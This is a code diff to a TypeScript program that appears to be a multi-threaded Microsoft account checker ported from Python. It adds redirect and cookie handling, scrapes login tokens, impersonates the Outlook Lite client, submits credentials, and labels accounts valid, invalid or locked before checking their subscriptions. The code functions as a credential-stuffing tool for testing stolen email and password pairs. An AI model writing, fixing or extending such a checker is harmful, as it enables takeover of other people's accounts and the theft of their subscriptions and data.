@@ -235,6 +235,48 @@ function formatDuration(ms: number): string {
   return `${minutes}m ${seconds}s`;
 }
 
+/**
+ * Follow redirects manually so we can capture Set-Cookie headers on EACH hop.
+ * Python requests.Session() does this automatically; fetch() does not expose intermediate Set-Cookie.
+ */
+async function fetchFollowRedirects(
+  url: string,
+  init: RequestInit,
+  jar: CookieJar,
+  maxHops = 10
+): Promise<{ finalUrl: string; res: Response; text: string }> {
+  let currentUrl = url;
+  let currentInit: RequestInit = { ...init, redirect: 'manual' };
+
+  for (let hop = 0; hop <= maxHops; hop++) {
+    const res = await fetch(currentUrl, currentInit);
+    jar.extractFromHeaders(res.headers);
+
+    // We must read the body to allow the caller to regex-match PPFT/urlPost
+    const text = await res.text();
+
+    const status = res.status;
+    const location = res.headers.get('location');
+
+    if (status >= 300 && status < 400 && location) {
+      const nextUrl = new URL(location, currentUrl).toString();
+
+      // After a redirect, browsers typically switch to GET.
+      currentUrl = nextUrl;
+      currentInit = {
+        method: 'GET',
+        headers: currentInit.headers,
+        redirect: 'manual'
+      };
+      continue;
+    }
+
+    return { finalUrl: currentUrl, res, text };
+  }
+
+  throw new Error('Too many redirects');
+}
+
 // Check Microsoft Subscriptions - follows Python logic exactly
 async function checkMicrosoftSubscriptions(session: CookieJar): Promise<{
   status: string;
@@ -444,19 +486,20 @@ async function checkAccount(
     console.log(`[${threadId}] Step 2: Getting auth page`);
     const authUrl = `https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=${encodeURIComponent(email)}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D`;
     
-    const authRes = await fetch(authUrl, {
-      headers: {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Connection": "keep-alive"
+    const { finalUrl: authFinalUrl, res: authRes, text: authText } = await fetchFollowRedirects(
+      authUrl,
+      {
+        method: 'GET',
+        headers: {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+          "Accept-Language": "en-US,en;q=0.9",
+          "Connection": "keep-alive"
+        }
       },
-      redirect: 'follow'
-    });
-    
-    cookies.extractFromHeaders(authRes.headers);
-    const authText = await authRes.text();
-    const authFinalUrl = authRes.url;
+      cookies,
+      10
+    );
     
     // Extract urlPost and PPFT (Python regex patterns)
     const urlMatch = authText.match(/urlPost":"([^"]+)"/);
@@ -487,6 +530,7 @@ async function checkAccount(
         "Referer": authFinalUrl,
         "Cookie": cookies.toString()
       },
+      body: loginData,
       redirect: 'manual'
     });
     
@@ -518,7 +562,8 @@ async function checkAccount(
     }
     
     if (loginText.includes("https://account.live.com/Abuse")) {
-      result.status = "locked";
+      // Python treats this as BAD
+      result.status = "invalid";
       result.checkDuration = Date.now() - startTime;
       return result;
     }
